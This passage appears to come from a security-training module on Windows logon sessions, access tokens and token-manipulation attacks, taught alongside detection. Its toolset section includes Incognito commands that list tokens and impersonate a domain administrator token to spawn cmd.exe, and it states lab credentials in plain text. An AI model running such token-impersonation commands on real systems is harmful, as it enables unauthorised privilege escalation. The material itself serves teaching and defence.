# Introduction

Authentication and authorization are foundational concepts that address two fundamental questions in security:

- `Authentication (Is the entity who it claims to be?)`: Authentication ensures that the identity of a user, system, or service is genuine. This verification is typically carried out using methods such as passwords, biometrics, or digital certificates. Authentication acts as the initial checkpoint for establishing trust between entities.

- `Authorization (What is the entity allowed to do?)`: Once authentication is successful, authorization defines the scope of actions or resources the entity is permitted to access. It enforces access controls to ensure that users, applications, or systems operate within their designated permissions.


In Windows environments, authentication and authorization are structured around [security principals](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-principals). These principals represent entities capable of initiating actions or requests and include: users, computers, groups and services. To implement authentication and authorization, Windows relies on two key mechanisms, `logon sessions` and `access tokens`.

- `Logon Session`: A logon session is created whenever a user successfully signs in to a system. This session uniquely identifies the authenticated user and their session-specific details. For example, when a user logs in, a logon session is established to track their identity and authentication data.

- `Access Token`: After the authentication process, Windows generates an access token, which serves as the `security context` for the user’s processes and threads. This token contains essential details, such as:
  - The user’s unique identifier (SID)
  - Membership in security groups
  - Assigned privileges
  - Integrity levels and associated claims

Access tokens are associated with processes or threads and govern what resources they can access and the actions they can execute. A deeper understanding of tokens is essential for understanding `access token manipulation`. According to MITRE, [Access Token Manipulation (T1134)](https://attack.mitre.org/techniques/T1134/) falls under the [Privilege Escalation (TA0004)](https://attack.mitre.org/tactics/TA0004/) and [Defense Evasion (TA0005)](https://attack.mitre.org/tactics/TA0005/) tactics. This involves an adversary manipulating access tokens to bypass access controls and gain unauthorized access to resources within a system or network.

![](https://academy.hackthebox.com/storage/modules/256/at-mitre_.png)

## Access Token Manipulation Techniques

The diagram below shows some common access token manipulation scenarios, which include how an access token is stolen from a target process and how an access token is created using stolen credentials. Once the access token is obtained, it can be used to perform further actions (such as [PPID Spoofing (T1134.004)](https://attack.mitre.org/techniques/T1134/004/)). The access token manipulation techniques shown in the diagram below are:

- `Token Privilege Modification`
- `Create Process with Token`
- `Token Impersonation`

![Scenarios](https://academy.hackthebox.com/storage/modules/256/scenarios_.png)

This module presents a comprehensive analysis of access token manipulation techniques used by attackers and provides guidance on detecting these threats.

Access token manipulation is a prevalent strategy used by adversaries to escalate privileges and avoid detection in Windows environments. The MITRE ATT&CK page for [Access Token Manipulation (T1134.004)](https://attack.mitre.org/techniques/T1134/004/) provides detailed information in the `Procedure Examples` section on how various threat actors execute related techniques.

![](https://academy.hackthebox.com/storage/modules/256/procedure.png)

For instance, the screenshot above demonstrates how adversaries manipulate an access token and enable specific privileges, such as `SeDebugPrivilege`. This privilege allows the debugging or manipulation of processes owned by other users, including those running with elevated privileges.

We can also observe that the [AdjustTokenPrivileges()](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges) WINAPI function is utilized. This function allows a process to adjust the privileges of an access token. Adversaries can exploit this to enable privileges that are typically disabled (such as `SeDebugPrivilege`), thereby escalating their privileges to carry out malicious actions.

![](https://academy.hackthebox.com/storage/modules/256/examples.png)

There are also attempts to escalate privileges to `NT Authority\SYSTEM`, which is the highest privilege level on a Windows system, equivalent to the `root` or `superuser` on Unix-based systems. Adversaries often target this privilege level to gain full control over a compromised system.

![](https://academy.hackthebox.com/storage/modules/256/example1.png)

Adversaries have also employed access token manipulation techniques to create new tokens from stolen credentials. They have used impersonation to access resources or perform actions that require higher privileges than those of the current user. This technique involves a thread assuming the identity of another user or security principal, typically to perform actions on their behalf. The screenshot below provides examples of various software/groups that have utilized this technique in real-world attacks.

![](https://academy.hackthebox.com/storage/modules/256/example2.png)

## API Functions Related to Access Tokens

API functions related to access tokens allow applications to manage and manipulate these tokens, enabling scenarios like impersonation, privilege elevation, and security checks. Some key API functions related to access tokens are categorized as follows:

### Token Creation

These functions are used to create or duplicate tokens:

| Function Name | Description |
| --- | --- |
| `OpenProcessToken` | Opens the access token associated with a process. |
| `OpenThreadToken` | Opens the access token associated with a thread. |
| `DuplicateToken` | Duplicates an existing access token, creating a new token with the same properties. |
| `DuplicateTokenEx` | Duplicates an access token and allows you to specify properties like the desired security level and token type. |
| `CreateRestrictedToken` | Creates a restricted token by removing privileges or restricting access to specific SIDs. |

### Token Manipulation

These functions modify or adjust the properties and privileges of tokens:

| Function Name | Description |
| --- | --- |
| `AdjustTokenPrivileges` | Enables or disables privileges in a token. |
| `AdjustTokenGroups` | Modifies the group memberships in a token. |
| `SetTokenInformation` | Changes properties of a token, such as default DACL or session ID. |

### Token Query

These functions retrieve information about a token:

| Function Name | Description |
| --- | --- |
| `GetTokenInformation` | Retrieves information about a token, such as privileges, owner, or groups. |
| `CheckTokenMembership` | Checks whether a token includes a specific SID in its groups. |
| `IsTokenRestricted` | Determines if a token is a restricted token. |

### Token Impersonation

These functions allow threads or processes to impersonate other security contexts:

| Function Name | Description |
| --- | --- |
| `ImpersonateLoggedOnUser` | Allows a thread to impersonate the security context of a logged-on user. |
| `ImpersonateSelf` | Enables a thread to impersonate itself for certain operations. |
| `RevertToSelf` | Ends impersonation, reverting the thread back to its original security context. |

### Miscellaneous

Other important functions related to tokens:

| Function Name | Description |
| --- | --- |
| `LogonUser` | Authenticates a user and returns a token that represents the user. |
| `CreateProcessAsUser` | Creates a new process using the security context of a specific token. |
| `CreateProcessWithTokenW` | Similar to CreateProcessAsUser, but explicitly requires a token handle. |
| `SetThreadToken` | Assigns a token to a thread for impersonation purposes. |

Please refer to [this](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens) Microsoft documentation to get more details on access tokens and WinAPI functions.

* * *

## Moving On

To understand access tokens and the attack techniques based on them, we'll go through the fundamental concepts related to processes and tokens, explore different ways to create processes, and then examine the attack scenarios and respective detection opportunities in the following sections. In the upcoming section, we'll cover some basic concepts of WinDbg, debuggers, disassemblers, and other tools used throughout this module.


# Intro to Toolset

Within the target (VM), we can locate the tools at the following paths:

| Name | Path |
| --- | --- |
| **API Monitor** | `C:\Program Files\rohitab.com\API Monitor\apimonitor-x64.exe` |
| **x64dbg** | `C:\Tools\x64dbg\release\x64\x64dbg.exe` |
| **SysinternalsSuite** | `C:\Tools\SysinternalsSuite` |
| **ProcessHacker** | `C:\Tools\ProcessHacker\ProcessHacker.exe` |
| **ProcMonX** | `C:\Tools\ProcMonX.exe` |
| **Full Event Log View** | `C:\Tools\fulleventlogview\C:\Tools\fulleventlogview.exe` |
| **Incognito** | `C:\Tools\incognito.exe` |
| **Tokenvator** | `C:\Tools\Tokenvator.exe` |
| **Token Player** | `C:\Tools\TokenPlayer.exe` |

* * *

There are several tools mentioned and used in the module that are commonly employed in security research and system analysis, such as debuggers like x64dbg and API Monitor to inspect API calls, and WinDbg to view important structures, among others. In this section, we'll explore the usage of these tools and go through the different tools used throughout the module.

## API Monitor

`API Monitor` is used to monitor and log API calls made by applications, which is useful for understanding program behavior and analyzing the function call trace.

![API Monitor](https://academy.hackthebox.com/storage/modules/256/apimon_.png)

The running processes pane in the bottom-left allows researchers to pick the process for monitoring.

![API Monitor](https://academy.hackthebox.com/storage/modules/256/apimon1_.png)

The `API Filter` pane allows the filtering of the API functions to be monitored.

![API Monitor](https://academy.hackthebox.com/storage/modules/256/apimon2_.png)

The `Monitored Processes` pane shows the list of processes that are currently being monitored.

![API Monitor](https://academy.hackthebox.com/storage/modules/256/apimon3_.png)

The API summary pane shows the list of API function calls with the parameters.

![API Monitor](https://academy.hackthebox.com/storage/modules/256/apimon4_.png)

* * *

## Procmon

[Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) (ProcMon), part of the Sysinternals suite, is used to monitor and log system activity, including file system and registry operations, process and thread activity, and network activity. It's also useful for analyzing system behavior while a program is executing.

![Proc Mon](https://academy.hackthebox.com/storage/modules/256/procmon.png)

ProcMon events display details such as the process name, the operation that has occurred (e.g., "Process Create"), the path of the application, the result, and any other details related to the operation.

We can add filters in ProcMon to focus only on the required events.

![Proc Mon](https://academy.hackthebox.com/storage/modules/256/procfilter.png)

We can filter based on many details, such as process name, PID, PPID, operation, etc., as shown in the screenshot below:

![Proc Mon](https://academy.hackthebox.com/storage/modules/256/procfilter1.png)

* * *

## Sysmon

[Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon) is another tool from the Sysinternals suite that monitors and logs system activity, with a focus on detecting and analyzing malicious activity. It provides detailed information about process creations, network connections, and changes to file creation times, among other things.

Sysmon is already running in the background as a service in the module target (VM). We can view the Sysmon Event Logs in the Event Viewer under the path Application and Service Logs > Microsoft-Windows-Sysmon/Operational as shown in the screenshot below.

![Proc Mon](https://academy.hackthebox.com/storage/modules/256/sysmon.png)

* * *

## Incognito

`Incognito` is an application that allows us to impersonate user tokens when successfully compromising a system. It was integrated into Metasploit and ultimately into Meterpreter. In simple terms, tokens are similar to web cookies. They act as temporary keys that grant access to systems and networks without requiring repeated authentication for each action. Incognito leverages this concept much like cookie-stealing attacks, by replaying the stolen token (temporary key) during authentication requests to bypass credential verification.

In Incognito, we can see two main types of tokens:

1. `Delegate Tokens`

- Used for interactive logons, such as logging into a machine locally or via Remote Desktop (RDP). These tokens allow processes to access network resources on behalf of the user.

1. `Impersonate Tokens`

- Used for non-interactive sessions, such as mapping network drives or executing domain logon scripts. These tokens enable processes to act as the user within a limited scope.

```cmd-session
Incognito Commands
==================

    Command              Description
    -------              -----------
	add_group_user       Attempt to add a user to a global group with all tokens
    add_localgroup_user  Attempt to add a user to a local group with all tokens
    add_user             Attempt to add a user with all tokens
    impersonate_token    Impersonate specified token
    list_tokens          List tokens available under current user context
    execute -c           Enable communication by console
    snarf_hashes         Snarf challenge/response hashes for every token

```

The command below identifies if there are any valid tokens on this system.

```cmd-session
C:\> C:\Tools\incognito.exe list_tokens -u

[-] WARNING: Not running as SYSTEM. Not all tokens will be available.
[*] Enumerating tokens
[*] Listing unique users found

Delegation Tokens Available
============================================
LEGACY\normal.user
LEGACY\administrator
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\SYSTEM
Window Manager\DWM-1

Impersonation Tokens Available
============================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-1
NT AUTHORITY\NETWORK SERVICE
Window Manager\DWM-2

Administrative Privileges Available
============================================
SeAssignPrimaryTokenPrivilege
SeCreateTokenPrivilege
SeTcbPrivilege
SeTakeOwnershipPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeRelabelPrivilege
SeLoadDriverPrivilege

```

The ability to view and manipulate tokens depends on the level of access your exploit provides. SYSTEM is the ultimate authority when it comes to token stealing, as it grants unrestricted access to all tokens on the machine.

As an example, we can run incognito with the " `execute`" command to impersonate `LEGACY\administrator` token and specify the program path (e.g., `cmd.exe`) to launch with the privileges of the impersonated user.

```cmd-session
C:\> C:\Tools\incognito.exe execute -c "LEGACY\administrator" C:\Windows\system32\cmd.exe
[-] WARNING: Not running as SYSTEM. Not all tokens will be available.
[*] Enumerating tokens
[*] Searching for availability of requested token
[+] Requested token found
[+] Delegation token available
[*] Attempting to create new child process and communicate via anonymous pipe

Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>

```

Then we'll use WinDbg to inspect and analyze various data structures within the Windows operating system, such as access tokens, process structures (like EPROCESS), security descriptors (SD), and more. It allows us to view the contents of these structures, understand how they are organized. So before using WinDbg, we'll see how we can setup the local kernel debugging in order to view the kernel structures in Windows.

## WinDbg

[WinDbg](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/) is a powerful debugger tool from Microsoft primarily used for analyzing and debugging Windows applications, drivers, and the operating system itself. It provides a command-line interface and a graphical user interface, making it suitable for a wide range of debugging tasks, including kernel-mode and user-mode debugging.

### Setting Up Local Kernel-Mode Debugging

**Note:** Kernel debugging is already enabled on the target system.

Setting up local kernel-mode debugging involves configuring your system to allow debugging operations. Below is a step-by-step guide:

1. **Open Command Prompt as Administrator**: Right-click on the Start menu and select Command Prompt (Admin).

2. **Enable Debugging**: Enter the following command to enable kernel debugging:


```cmd-session
C:\> bcdedit /debug on
The operation completed successfully.

```

This command will enable the kernel debugging mode.

1. **Reboot**: Restart your computer to apply the changes. After the reboot, the system should be set up for local kernel-mode debugging. We can then use WinDbg to analyze kernel memory and debug kernel-mode drivers.

2. **Open WinDbg**: Launch WinDbg as an administrator.

3. **Attach to the Kernel**: Go to "File" > "Start debugging" > "Attach to Kernel" > "Local". Click OK to start debugging.


![Windbg](https://academy.hackthebox.com/storage/modules/256/windbg.png)

1. **Load the Symbols**: Once connected, load the symbols for the kernel and any relevant modules using the following command.

```windbg
.symfix
.reload

```

The `.symfix` command sets the symbol path to Microsoft's symbol server. This is useful if we don't have a specific symbol path set up or if we want to use Microsoft's symbols. The `.reload` command reloads symbols for the current debugging session, which is useful after setting or changing the symbol path. Once WinDbg is set up and ready, we can go through the different structures used throughout this module.

**Note:** For the target (VM) of this module, the WinDbg symbols are updated.

**View Process Structure**: To view a process structure, we first need to find the `EPROCESS` structure for the process we're interested in. We can use the `!process` command to list all processes and find the address of the `EPROCESS` structure for the process we want to examine. For example:

```windbg
!process 0 0

```

This command will list all processes along with their EPROCESS structure addresses. Find the address of the process we're interested in (e.g., 0xfffff80312345678).

![processes](https://academy.hackthebox.com/storage/modules/256/processes.png)

We can take an example of the `winlogon.exe` process and view the contents of its EPROCESS structure for the `winlogon.exe` process.

![winlogon](https://academy.hackthebox.com/storage/modules/256/winlogon.png)

**View the EPROCESS Structure**: We can use the `dt` (display type) command to display the contents of a structure, for example, the `EPROCESS` structure.

```windbg
dt nt!_EPROCESS

```

![eprocess](https://academy.hackthebox.com/storage/modules/256/eprocess.png)

The above command displays the layout of the `_EPROCESS` structure template defined in the Windows symbol file. It shows the structure's members and their types, but it does not display any actual data. It's like a blueprint for the structure.

Once we have the `EPROCESS` address, we can use the `dt` (display type) command to display the `EPROCESS` structure. For example, to display the `EPROCESS` structure for the process winlogon.exe at address `ffffbd03fefa2080`, use:

```windbg
dt nt!_EPROCESS ffffbd03fefa2080

```

![Eprocess winlogon](https://academy.hackthebox.com/storage/modules/256/eproc.png)

This command uses the blueprint from `nt!_EPROCESS` to interpret the data at the memory address `ffffbd03fefa2080` as an `_EPROCESS` structure. It displays the actual contents of the `_EPROCESS` structure at that memory address, including the values of its members. This is useful for inspecting the state of a specific process in memory.

Below are some more examples of important WinDbg commands:

- `!process 0 0` \- List all processes and their EPROCESS addresses.

```windbg
!process 0 0

```

- `!thread` \- Displays information about a specific thread or all threads.

```windbg
!thread

```

- `!token` \- Display information about the security token of a specified process.

```windbg
!token <EPROCESS_Address>

```

- `!sd` \- Display the security descriptor of a specified object.

```windbg
!sd <Address_of_SD>

```

- `!object` \- Display information about a specified object, including its security descriptor.

```windbg
!object <Address_of_Object>

```

Some more commands are documented [here](http://www.windbg.info/doc/1-common-cmds.html). We'll use the different commands and view the output in detail in the later sections.

## Remote Host Event Logs

In some sections, we'll use Event Viewer to open Event Logs of a remote machine. To do that, we can open Event Viewer by pressing `Win + R`, typing `eventvwr`, and press Enter. In the left pane, right-click on "Event Viewer (Local)" and select "Connect to Another Computer". Enter the name or IP address of the target computer (e.g., DC01). Also, provide the credentials for a user account that has the permissions to read event logs on the remote computer. In our case, the credentials are `LEGACY\logman`, and the password is `logger@123`. After entering the password, we can Click OK.

Once connected, navigate through the logs as you would on the local machine.

This whole process is demonstrated in the GIF shown below:

![processes](https://academy.hackthebox.com/storage/modules/256/remotelogs.gif)


# Windows Logon Process

* * *

## Logon Session

When a user logs in to the system, a logon session is created by the respective authentication package upon successful authentication. During this logon session, Windows creates a security context for the user, which includes an access token that contains information about the user's identity, groups, and privileges. Logon sessions are important for maintaining security and tracking user activity on a system. The diagram below illustrates how an access token is associated with a logon session, with credentials cached for the session (for example - `LEGACY\normal.user`) to facilitate re-authentication when required.

![Logonsession](https://academy.hackthebox.com/storage/modules/256/logonsession1-.png)

Here, `LEGACY` refers to the Active Directory domain name, and `normal.user` refers to the username.

Logon sessions in Windows are managed by the Local Security Authority (LSA) process (lsass.exe). The LSA is a system process responsible for enforcing security policies on the system, including managing user authentication and access control. When a user logs in to the system, the LSA validates the user's credentials (such as username and password) and creates a logon session for the user. The LSA also creates an access token for the user, which is used to determine the user's permissions and access rights on the system.

## View Logon Sessions

A logon session is established when a user account or service account is verified by Windows. This verification process, known as authentication, can occur through various methods. For instance, it can happen when a user logs in interactively at a console or a remote desktop dialog box, when network authentication is performed for accessing a file share or a web application, when the service control manager starts a service using saved credentials, or when the Secondary Logon service is utilized with RunAs.exe.

Let's navigate to the bottom of this section and click on "Click here to spawn the target system!". Then, let's RDP into the Target IP using the provided credentials. The mentioned tools (inclduing WinDbg) are installed on the target system and the shortcut files are created on the desktop. The vast majority of the actions/commands covered from this point up to end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Within the target (VM), we can locate the tools at the following paths:

- **LogonSessions**: `C:\Tools\SysinternalsSuite\logonsessions64.exe`

When we log on to a system, there's an active logon session created. However, it's not the only one active logon session, but there can be more than one. The [LogonSessions](https://learn.microsoft.com/en-us/sysinternals/downloads/logonsessions) utility from Sysinternals suite can help in listing the logon sessions on a system.

```cmd-session
C:\> C:\Tools\SysinternalsSuite\logonsessions64.exe

LogonSessions v1.41 - Lists logon session information
Copyright (C) 2004-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

[0] Logon session 00000000:000003e7:
    User name:    LEGACY\WIN-TOKEN$
    Auth package: Negotiate
    Logon type:   (none)
    Session:      0
    Sid:          S-1-5-18
    Logon time:   5/2/2024 6:01:24 AM
    Logon server:
    DNS Domain:   LEGACY.CORP
    UPN:          [email protected]

[1] Logon session 00000000:00008a84:
    User name:
    Auth package: NTLM
    Logon type:   (none)
    Session:      0
    Sid:          (none)
    Logon time:   5/2/2024 6:01:24 AM
    Logon server:
    DNS Domain:
    UPN:

[2] Logon session 00000000:000003e5:
    User name:    NT AUTHORITY\LOCAL SERVICE
    Auth package: Negotiate
    Logon type:   Service
    Session:      0
    Sid:          S-1-5-19
    Logon time:   5/2/2024 6:01:25 AM
    Logon server:
    DNS Domain:
    UPN:

[3] Logon session 00000000:000355a6:
    User name:    LEGACY\normal.user
    Auth package: Kerberos
    Logon type:   Interactive
    Session:      1
    Sid:          S-1-5-21-1507357100-3087530421-3589589134-1105
    Logon time:   5/2/2024 6:02:50 AM
    Logon server: DC01
    DNS Domain:   LEGACY.CORP
    UPN:          [email protected]

...SNIP...

[9] Logon session 00000000:000355d9:
    User name:    LEGACY\normal.user
    Auth package: Negotiate
    Logon type:   Interactive
    Session:      1
    Sid:          S-1-5-21-1507357100-3087530421-3589589134-1105
    Logon time:   5/2/2024 6:02:50 AM
    Logon server: DC01
    DNS Domain:   LEGACY.CORP
    UPN:          [email protected]

```

Every logon session is assigned a `LUID` (locally unique identifier), which is a 64-bit value generated by the system. This value is guaranteed to be unique for the duration of a single boot session on the system where it was created. Some LUIDs are predefined, such as `0x3e7` (999 decimal) for the System account's logon session, `0x3e4` (996) for the Network Service's session, and `0x3e5` (997) for the Local Service's session. The majority of other LUIDs are randomly generated. For example, the logon session mentioned below has `00000000:000003e7`, ending with `3e7` representing the System account's logon session.

```cmd-session
C:\> C:\Tools\SysinternalsSuite\logonsessions64.exe

LogonSessions v1.41 - Lists logon session information
Copyright (C) 2004-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

[0] Logon session 00000000:000003e7:
    User name:    LEGACY\WIN-TOKEN$
    Auth package: Negotiate
    Logon type:   (none)
    Session:      0
    Sid:          S-1-5-18
    Logon time:   5/2/2024 6:01:24 AM
    Logon server:
    DNS Domain:   LEGACY.CORP
    UPN:          [email protected]

...SNIP...

```

If we specify the `-p` option, we can also view the processes running in each session.

```cmd-session
C:\> C:\Tools\SysinternalsSuite\logonsessions64.exe -p

LogonSessions v1.41 - Lists logon session information
Copyright (C) 2004-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

...SNIP...

[10] Logon session 00000000:00096869:
    User name:    LEGACY\normal.user
    Auth package: Negotiate
    Logon type:   RemoteInteractive
    Session:      2
    Sid:          S-1-5-21-1507357100-3087530421-3589589134-1105
    Logon time:   5/2/2024 2:10:50 AM
    Logon server: DC01
    DNS Domain:   LEGACY.CORP
    UPN:          [email protected]
     4376: rdpclip.exe
     3636: sihost.exe
     1440: svchost.exe
      836: svchost.exe
     1936: taskhostw.exe
     2504: ctfmon.exe
     4228: explorer.exe
     3524: ShellExperienceHost.exe
     3124: SearchUI.exe
     5156: RuntimeBroker.exe
     5328: RuntimeBroker.exe
     5652: RuntimeBroker.exe
     5748: smartscreen.exe
     5864: vm3dservice.exe
...SNIP...

```

## Logon Types

Logon type refers to the method or mode by which a user or process is authenticated and granted access to a system. It defines how the logon occurred, such as through interactive logon, network logon, or batch logon. The snippet below shows different logon types for various logon sessions. Look at the `Logon Type` values such as `Service`, `Interactive`, and `Network`.

```cmd-session
C:\> C:\Tools\SysinternalsSuite\logonsessions64.exe

LogonSessions v1.41 - Lists logon session information
Copyright (C) 2004-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

...SNIP...

[2] Logon session 00000000:000003e5:
    User name:    NT AUTHORITY\LOCAL SERVICE
    Auth package: Negotiate
    Logon type:   Service
    Session:      0
    Sid:          S-1-5-19
    Logon time:   5/2/2024 6:01:25 AM
    Logon server:
    DNS Domain:
    UPN:

[3] Logon session 00000000:000355a6:
    User name:    LEGACY\normal.user
    Auth package: Kerberos
    Logon type:   Interactive
    Session:      1
    Sid:          S-1-5-21-1507357100-3087530421-3589589134-1105
    Logon time:   5/2/2024 6:02:50 AM
    Logon server: DC01
    DNS Domain:   LEGACY.CORP
    UPN:          [email protected]

[4] Logon session 00000000:00bc8e84:
    User name:    LEGACY\Administrator
    Auth package: Kerberos
    Logon type:   Network
    Session:      0
    Sid:          S-1-5-21-1507357100-3087530421-3589589134-500
    Logon time:   5/2/2024 3:56:42 AM
    Logon server:
    DNS Domain:   LEGACY.CORP
    UPN:

```

For a more detailed description of logon types, Microsoft offers additional information at the following link:

[Audit Logon Events](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc787567(v=ws.10)?redirectedfrom=MSDN).

![Logon Types](https://academy.hackthebox.com/storage/modules/256/logontypes.png)

## Information provided by Logon Sessions

Let's understand the details about the information provided by the LogonSessions tool.

```cmd-session
[4] Logon session 00000000:00bc8e84:
    User name:    LEGACY\Administrator
    Auth package: Kerberos
    Logon type:   Network
    Session:      0
    Sid:          S-1-5-21-1507357100-3087530421-3589589134-500
    Logon time:   5/2/2024 3:56:42 AM
    Logon server:
    DNS Domain:   LEGACY.CORP
    UPN:

```

In the above output, we can see some details about the logon sessions mentioned as follows:

- `User name`: The username of the logged-on user.
- `Auth package`: The authentication package used for the logon session. This can be one of several security protocols, such as Negotiate, NTLM, or Kerberos.
- `Logon type`: The type of logon. For example, "RemoteInteractive" typically indicates a logon via Remote Desktop or similar remote access methods.
- `Session`: The session ID of the logon session.
- `Sid`: The security identifier (SID) of the user.
- `Logon time`: The date and time when the logon session was established.
- `Logon server`: The server used for the logon process.
- `DNS Domain`: The DNS domain of the user.
- `UPN`: The user principal name of the user.

### Authentication packages

In the above logon sessions output, the Auth package (i.e., [Authentication packages](https://learn.microsoft.com/en-us/windows/win32/secauthn/authentication-packages)) are actually the dynamic-link libraries [(DLLs)](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4610) that are loaded by the Local Security Authority (LSA) to support various security protocols. Each time the system starts, the LSA loads the Authentication Package DLLs from the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Authentication Packages` registry value and performs the initialization sequence for every package located in these DLLs.

```cmd-session
C:\> C:\Tools\SysinternalsSuite\logonsessions64.exe

LogonSessions v1.41 - Lists logon session information
Copyright (C) 2004-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

...SNIP...

[2] Logon session 00000000:000003e5:
    User name:    NT AUTHORITY\LOCAL SERVICE
    Auth package: Negotiate
    Logon type:   Service
    Session:      0
    Sid:          S-1-5-19
    Logon time:   5/2/2024 6:01:25 AM
    Logon server:
    DNS Domain:
    UPN:

[3] Logon session 00000000:000355a6:
    User name:    LEGACY\normal.user
    Auth package: Kerberos
    Logon type:   Interactive
    Session:      1
    Sid:          S-1-5-21-1507357100-3087530421-3589589134-1105
    Logon time:   5/2/2024 6:02:50 AM
    Logon server: DC01
    DNS Domain:   LEGACY.CORP
    UPN:          [email protected]

[4] Logon session 00000000:00bc8e84:
    User name:    LEGACY\Administrator
    Auth package: Kerberos
    Logon type:   Network
    Session:      0
    Sid:          S-1-5-21-1507357100-3087530421-3589589134-500
    Logon time:   5/2/2024 3:56:42 AM
    Logon server:
    DNS Domain:   LEGACY.CORP
    UPN:

```

The SSP authentication packages provided by [Microsoft](https://learn.microsoft.com/en-us/windows/win32/secauthn/ssp-packages-provided-by-microsoft) are as follows:

- [CredSSP (Credential Security Support Provider)](https://learn.microsoft.com/en-us/windows/win32/secauthn/credential-security-support-provider)
- [Negotiate](https://learn.microsoft.com/en-us/windows/win32/secauthn/microsoft-negotiate)
- [NTLM](https://learn.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm)
- [Kerberos](https://learn.microsoft.com/en-us/windows/win32/secauthn/microsoft-kerberos)
- [Digest SSP](https://learn.microsoft.com/en-us/windows/win32/secauthn/microsoft-digest-ssp)
- [Secure Channel (also known as Schannel)](https://learn.microsoft.com/en-us/windows/win32/secauthn/secure-channel)

The Negotiate package, in particular, automatically selects between NTLM and Kerberos based on the capabilities of the client and server, providing a more flexible authentication mechanism.

Throughout the logon session, the LSA continues to manage the user's access rights and security context, ensuring that the user only has access to resources and performs actions that are allowed by the system's security policies. When a user logs in, an access token is generated to encapsulate the security context of the account. This token is duplicated for use by processes and threads operating under that security context and contains a link back to its original logon session. The logon session remains active as long as there are duplicated tokens referencing it.

## LSA

The Local Security Authority (LSA) is a critical component of the Windows operating system responsible for managing security-related operations. It plays a key role in authenticating users, verifying permissions, and handling other security-related tasks. The LSA operates primarily as a user-mode service named LSASS (Local Security Authority Subsystem Service). LSA is responsible for enforcing the security policy on the system and is implemented as a dynamic-link library (DLL) called `lsasrv.dll`, running in the LSASS process ( `lsass.exe`).

When Windows starts up, it initiates the `winlogon.exe` process, which is responsible for initializing the current user's registry and starting their user shell. To gather login credentials, Winlogon triggers LogonUI, which in turn interacts with credential providers (such as password, PIN, or Windows Hello). The Windows Logon Application manages the login process, displaying the appropriate login interface (e.g., password prompt, Windows Hello dialog) based on the available authentication methods.

Once the user provides their credentials, Winlogon requests the authentication package by calling the `LsaLookupAuthenticationPackage` function in the LSASS process. The Local Security Authority (LSA) provides a function named `LsaLogonUser`, which communicates with winlogon via the Local Procedure Call (LPC) protocol. LPC facilitates inter-process communication between processes running on the same machine. If the authentication is successful, an access token is created for the user. This token contains information about the user's security context, including their security identifier (SID), group SIDs, and privileges.

The diagram below shows an overall flow of this process.

![LSA](https://academy.hackthebox.com/storage/modules/256/lsa_.png)

The key steps involved are mentioned as follows:

- `User Credentials Submission`: The process begins with the user entering their logon credentials, such as a username and password.
- `Authentication Request`: The Local Security Authority (LSA) passes the credentials to the designated authentication package, such as `MSV1_0` or `Kerberos`.
- `Credential Validation`: The selected authentication package validates the user-provided credentials by checking against local data (e.g., SAM database) or querying a domain controller in an Active Directory environment.
- `Session Creation`: Upon successful validation, the authentication package generates a new logon session. This includes assigning a unique Logon Session ID (LUID) and creating Security Identifiers (SIDs) for the session. These details are critical for defining user identity and privileges.
- `Access Token Generation`: The LSA then creates an access token, which contains the security context for the user. The access token encapsulates the user's privileges, group memberships, and other security attributes. This token is attached to processes or threads initiated by the user during their session.

Logon sessions are established first as part of the authentication process, and only after a successful logon session is created can an access token be generated. The access token serves as a representation of the authenticated user’s security context, which is then used to manage access to resources and processes.

### Logon Info in Event Viewer

The Windows Event Viewer logs detailed information about login events. We can open the Event Viewer by typing "Event Viewer" in the Windows search bar and selecting the application. In the Event Viewer, navigate to Windows Logs > Security. Look for Event ID 4624 for successful logons or Event ID 4625 for failed logons.

![LSA](https://academy.hackthebox.com/storage/modules/256/logon1.png)

In the event, the subject contains the account that initiated the logon request. The logon type indicates the type of logon, such as 2 for Interactive (logged in directly at the console). The account information contains the Account Name and Account Domain of the user who logged in. The logon ID contains a unique identifier for the session. The network information displays the source IP address and hostname for network logons.

When an administrator performs an interactive logon on a system with [UAC](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/) (User Account Control) enabled, two logon sessions are created, as shown in the screenshot below:

- `Non-Elevated (Standard User) Logon Session`
- `Linked Elevated (Administrator) Logon Session`

![LSA](https://academy.hackthebox.com/storage/modules/256/linkedlogon.png)

- `Non-Elevated (Standard User) Logon Session`: By default, the user's logon session starts as a non-elevated session, even if they belong to the Administrators group. This session runs with limited privileges, following the principle of least privilege. This is designed to reduce the risk of privilege abuse or accidental changes to the system. This logon session is associated with the non-elevated access token, where administrative privileges are stripped out.

- `Linked Elevated (Administrator) Logon Session`: When the user performs an administrative action (e.g., running a program as an administrator), UAC prompts for consent or credentials (depending on the configuration). Upon approval, a separate elevated logon session is created. This session is associated with a full administrator access token that includes elevated privileges. The elevated logon session is linked to the non-elevated session through a Logon GUID (Globally Unique Identifier) or a similar identifier.


Windows manages these two sessions with the help of Standard and Elevated tokens.

- `Standard Token`: Represents the limited session with restricted rights.
- `Elevated Token`: Represents the full administrative session with elevated privileges.

These tokens are linked internally, allowing the system to differentiate between the standard user context and the elevated administrative context. As shown in the above screenshot, Event Viewer can show these linked sessions. The linkage between the two sessions can be used to trace user actions from a non-elevated session to its corresponding elevated activities.

* * *

